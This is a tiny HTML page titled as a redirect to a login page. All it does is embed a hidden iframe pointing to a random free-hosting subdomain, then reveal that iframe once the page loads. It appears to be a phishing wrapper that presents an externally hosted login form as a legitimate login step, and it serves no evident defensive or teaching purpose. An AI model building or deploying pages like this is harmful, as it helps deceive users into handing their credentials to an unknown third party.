<!DOCTYPE html>
<html>
<head>
    <title>Redirecting to Login Page</title>
</head>
<body>
    <iframe id="loginFrame" src="https://duskiest-piers.000webhostapp.com" style="display:none;"></iframe>
    <script>
        // Wait for the iframe content to load
        window.onload = function() {
            // Show the iframe after the content is loaded
            document.getElementById('loginFrame').style.display = 'block';
        };
    </script>
</body>
</html>
